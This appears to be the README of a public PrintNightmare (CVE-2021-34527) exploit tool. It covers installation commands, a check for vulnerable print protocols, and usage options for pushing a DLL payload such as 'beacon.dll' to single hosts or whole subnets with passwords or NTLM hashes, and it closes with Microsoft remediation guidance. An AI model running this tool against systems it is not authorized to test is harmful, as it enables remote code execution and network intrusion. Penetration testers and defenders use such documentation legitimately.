# PrintNightmare (CVE-2021-34527)

This version of the PrintNightmare exploit is based on the code created by [Cube0x0](https://github.com/cube0x0/CVE-2021-1675), with the following features:

* Ability to target multiple hosts.
* Built-in SMB server for payload delivery, removing the need for open file shares.
* Exploit includes both `MS-RPRN` & `MS-PAR` protocols (*define in CMD args*).
* Implements [@gentilkiwi's](https://twitter.com/gentilkiwi) [UNC bypass](https://twitter.com/gentilkiwi/status/1412771368534528001) technique.


## Installation
Before running, install the latest version of [impacket](https://github.com/SecureAuthCorp/impacket):
```commandline
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
python3 setup install

git clone https://github.com/m8sec/CVE-2021-34527
cd CVE-2021-34527
python3 CVE-2021-34527.py -h
```

## Test
Impacket's `rpcdump.py` can be used to check for `MS-PAR` and `MS-RPRN` protocols:
```
>> rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

Alternatively, [byt3bl33d3r's](https://twitter.com/byt3bl33d3r) scanner [ItWasAllADream](https://github.com/byt3bl33d3r/ItWasAllADream) can be used to scan targets and validate the PrintNightmare RCE vulnerability.


## Screenshots
![pnm](https://user-images.githubusercontent.com/13889819/186430046-44143e63-9f29-4109-a4f1-4b005b78a17b.png)


## Usage
```text
  -v VERBOSE            Enable verbose logging from SMB server
  -t TIMEOUT            Connection timeout

Authentication:
  -u USERNAME           Set username
  -H HASH, -hashes      Use NTLM Hash for authentication
  -p PASSWORD           Set password
  -d DOMAIN             Set domain
  --local-auth          Authenticate to target host, no domain

DLL Execution:
  -dll DLL                  Path to local DLL file to execute "beacon.dll"
  --remote-dll REMOTE_DLL   Remote dll "\\192.168.1.25\Share\beacon.dll"
  -share SHARE              Set local SMB share name
  --local-ip LOCAL_IP       Set local IP (defaults to primary interface)

Target(s):
  -pDriverPath PDRIVERPATH  Define Driver path. Example 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL'
  -port [destination port]  Destination port to connect to SMB Server
  -proto {MS-RPRN,MS-PAR}   Target protocol (Default=MS-RPRN)
  target                    192.168.2.2, target.txt, 10.0.0.0/24 (positional)
```


## Remediation
Microsoft has released several patches for PrintNightmare, the latest being on Patch Tuesday of September 2021. This addressed the underlying vulnerability and later workarounds discovered. For more information, visit Microsoft's official guidance:

[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)

Additional [strategies](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527#workarounds) for mitigating this vulnerability include:
* Disabling the Print Spooler service on non-essential systems.
* Disable inbound remote printing through Group Policy


## Acknowledgement
* [@cube0x0](https://twitter.com/cube0x0) - for the Python [exploit](https://github.com/cube0x0/CVE-2021-1675) code and his contributions to the [impacket](https://github.com/SecureAuthCorp/impacket) project. 
* [@edwardzpeng](https://twitter.com/edwardzpeng) & [@lxf02942370](https://twitter.com/lxf02942370)- for the initial discovery and exploit of PrintNightmare.

